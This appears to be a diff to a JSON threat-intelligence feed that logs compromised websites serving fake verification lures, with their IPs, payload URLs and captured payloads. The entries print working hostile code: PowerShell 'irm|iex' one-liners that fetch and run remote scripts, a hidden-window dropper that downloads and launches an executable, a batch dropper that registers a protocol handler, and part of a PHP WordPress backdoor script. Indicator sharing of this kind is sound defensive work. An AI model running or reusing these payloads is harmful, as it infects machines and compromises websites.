@@ -1,5 +1,189 @@
 [
   {
+    "UrlDomain": "premierhomerepairservices.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://loayardes.cc/saykatproliv1/0a5c25be5fb2ab02",
+      "https://loayardes.cc/saykatproliv1/0ec5294f8c98f3be",
+      "https://loayardes.cc/saykatproliv1/f7bbd6e880f3f72d"
+    ],
+    "IP": [
+      "209.133.215.80"
+    ],
+    "Related": [],
+    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwwjla6o00hi0omls2saar36",
+    "ScannedAt": "2026-11-25T19:54:28.002000+00:00"
+  },
+  {
+    "UrlDomain": "www.tlcamperhire.co.uk",
+    "DeliveryUrl": [
+      "likingdropout.site"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "84.17.46.49"
+    ],
+    "Related": [],
+    "Payload": "$tok='OH5gRSYNWfLOBgk0ncAvvKiJtuvKCihWvCFsGEEcfBE';$id='0dea78b107d91fcf';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwwjg7zq009r0omlh8e6vce8",
+    "ScannedAt": "2026-11-25T19:50:31.854000+00:00"
+  },
+  {
+    "UrlDomain": "phpkaynak.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "104.21.57.173"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwjfozi008z0omlne52j4i0",
+    "ScannedAt": "2026-11-25T19:50:07.199000+00:00"
+  },
+  {
+    "UrlDomain": "kusadasimedya.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "104.21.69.180"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwjf99d007i0oml80x5mdjm",
+    "ScannedAt": "2026-11-25T19:49:46.838000+00:00"
+  },
+  {
+    "UrlDomain": "lagedor.net",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.167"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/9a3e2f700f7d099a",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29927269",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/9a3e2f700f7d099a'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/9a3e2f700f7d099a"
+    ],
+    "ReportId": "cmwwjeyhw006g0omlygg13f11",
+    "ScannedAt": "2026-11-25T19:49:32.885000+00:00"
+  },
+  {
+    "UrlDomain": "isparta-eticaret.xyz",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwjes1a005m0oml7y2oul78",
+    "ScannedAt": "2026-11-25T19:49:24.536000+00:00"
+  },
+  {
+    "UrlDomain": "ispartaweb-tasarim.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "104.21.9.129"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwj15ef001h0oml04xsg2rm",
+    "ScannedAt": "2026-11-25T19:38:48.661000+00:00"
+  },
+  {
+    "UrlDomain": "lcrn.mx",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "74.208.234.17"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/dd19016b6c277d04",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/dd19016b6c277d04'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/dd19016b6c277d04"
+    ],
+    "ReportId": "cmwwj0nvv000e0omlrzpsql9i",
+    "ScannedAt": "2026-11-25T19:38:25.950000+00:00"
+  },
+  {
+    "UrlDomain": "eduxmanager.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "20.115.232.15"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      },
+      {
+        "Value": "a",
+        "Type": "Hostname"
+      },
+      {
+        "Value": "b",
+        "Type": "Hostname"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D"
+    ],
+    "ReportId": "cmwwhss5u0jtf0nmlt7brl6jz",
+    "ScannedAt": "2026-11-25T19:04:18.623000+00:00"
+  },
+  {
     "UrlDomain": "gupsedu.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -4898,47 +5082,5 @@
     ],
     "ReportId": "cmwo69tad1xsb0omltg23i5hb",
     "ScannedAt": "2026-11-19T23:19:28.448000+00:00"
-  },
-  {
-    "UrlDomain": "prosper.services",
-    "DeliveryUrl": [
-      "baseupdate2798.com"
-    ],
-    "PayloadUrl": [
-      "https://baseupdate2798.com/ue/x/1avyGp5x",
-      "https://baseupdate2798.com/ue/b/1avyGp5x",
-      "https://baseupdate2798.com/ue/c/gW8g2U52"
-    ],
-    "IP": [
-      "162.210.96.117"
-    ],
-    "Related": [],
-    "Payload": "@echo off\r\nif \"%~1\"==\"_h\" goto :work\r\nstart \"\" /min cmd /c call \"%~f0\" _h\r\nexit /b\r\n:work\r\ntimeout /t 1 >nul\r\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\r\nset \"l=%PUBLIC%\\v.txt\"\r\nmd \"%d%\" 2>nul\r\ncd /d \"%d%\"\r\necho z>>\"%l%\"\r\ndel /q v.txt 2>nul\r\ndel /q vclreg.exe 2>nul\r\ndel /q vclx370.dat 2>nul\r\nif exist vclreg.exe echo lockexe>>\"%l%\"\r\nif exist vclx370.dat echo lockbpl>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://baseupdate2798[.]com/ue/x/1avyGp5x <nul\r\necho x%errorlevel%>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://baseupdate2798[.]com/ue/b/1avyGp5x <nul\r\necho b%errorlevel%>>\"%l%\"\r\ndel /q vclreg.exe:Zone.Identifier 2>nul\r\ndel /q vclx370.dat:Zone.Identifier 2>nul\r\nver >nul\r\n>t echo 1avyGp5x baseupdate2798[.]com\r\nif exist vclreg.exe echo exe>>\"%l%\"\r\nif exist vclx370.dat echo bpl>>\"%l%\"\r\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\r\nif exist vclreg.exe if exist vclx370.dat (\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\r\necho r%errorlevel%>>\"%l%\"\r\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\r\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\r\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\r\n)\r\necho s%errorlevel%>>\"%l%\"\r\ntimeout /t 1 >nul\r\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\r\ndel /q \"%TEMP%\\t.url\" 2>nul",
-    "ResolvedDownloadUrl": [
-      "https://baseupdate2798.com/ue/x/1avyGp5x",
-      "https://baseupdate2798.com/ue/b/1avyGp5x"
-    ],
-    "ReportId": "cmwnyjfio1xkd0oml9ql1oc6y",
-    "ScannedAt": "2026-11-19T19:43:00.229000+00:00"
-  },
-  {
-    "UrlDomain": "8cdigit.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "184.168.108.26"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwnxm1t71xj30oml4e26u03q",
-    "ScannedAt": "2026-11-19T19:17:02.747000+00:00"
   }
 ]
